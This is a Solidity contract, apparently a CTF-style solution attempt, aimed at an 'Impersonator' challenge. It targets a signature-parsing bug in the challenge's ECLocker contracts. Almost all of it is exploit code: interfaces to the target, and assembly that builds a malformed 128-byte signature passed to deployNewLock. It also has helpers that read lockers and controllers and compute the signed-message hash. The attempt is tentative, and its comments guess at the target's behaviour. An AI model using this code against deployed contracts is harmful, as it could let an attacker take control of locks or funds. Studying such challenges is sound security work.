// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IImpersonator {
    function owner() external view returns (address);
    function deployNewLock(bytes memory signature) external;
    function lockers(uint256) external view returns (address);
    function lockCounter() external view returns (uint256);
}

interface IECLocker {
    function controller() external view returns (address);
    function open(uint8 v, bytes32 r, bytes32 s) external;
    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external;
}

contract ExploitImpersonator {
    address public impersonator;
    
    constructor(address _impersonator) {
        impersonator = _impersonator;
    }
    
    // Check if we can find existing lockers
    function checkExistingLocker() external view returns (address locker, address controller) {
        try IImpersonator(impersonator).lockers(0) returns (address _locker) {
            if (_locker != address(0)) {
                locker = _locker;
                controller = IECLocker(_locker).controller();
            }
        } catch {}
    }
    
    // Try to exploit the signature parsing bug
    function exploitSignatureBug() external {
        // Create a malformed signature that exploits the memory layout bug
        // The constructor reads:
        // - v from offset 0x60 (beyond typical 65-byte signature)
        // - r from offset 0x20 (first 32 bytes of data)
        // - s from offset 0x40 (bytes 32-63 of data)
        
        // We need at least 96 bytes to avoid reading uninitialized memory
        bytes memory signature = new bytes(128); // Extra space to control what's at offset 0x60
        
        // Try to make ecrecover return a predictable address or fail in a useful way
        // Since it's using address(1) for ecrecover, the staticcall might behave differently
        
        // Set some values
        assembly {
            // signature + 0x20 is where data starts (after length)
            // So signature + 0x20 + 0x00 = r position
            mstore(add(signature, 0x20), 0x0000000000000000000000000000000000000000000000000000000000000001)
            // signature + 0x20 + 0x20 = s position  
            mstore(add(signature, 0x40), 0x0000000000000000000000000000000000000000000000000000000000000002)
            // signature + 0x20 + 0x40 = v position (this is at offset 0x60 from signature pointer)
            mstore(add(signature, 0x60), 0x000000000000000000000000000000000000000000000000000000000000001b) // v=27
        }
        
        // Try to deploy with this signature
        try IImpersonator(impersonator).deployNewLock(signature) {
            // Success!
        } catch {
            // Failed, but that's expected if we're not the owner
        }
    }
    
    // Get the calculated msgHash for a given lockId
    function calculateMsgHash(uint256 lockId) external pure returns (bytes32) {
        bytes32 msgHash;
        assembly {
            mstore(0x00, "\x19Ethereum Signed Message:\n32")
            mstore(0x1C, lockId)
            msgHash := keccak256(0x00, 0x3c)
        }
        return msgHash;
    }
    
    // Try to become the owner
    function tryBecomeOwner() external view returns (address currentOwner) {
        currentOwner = IImpersonator(impersonator).owner();
    }
}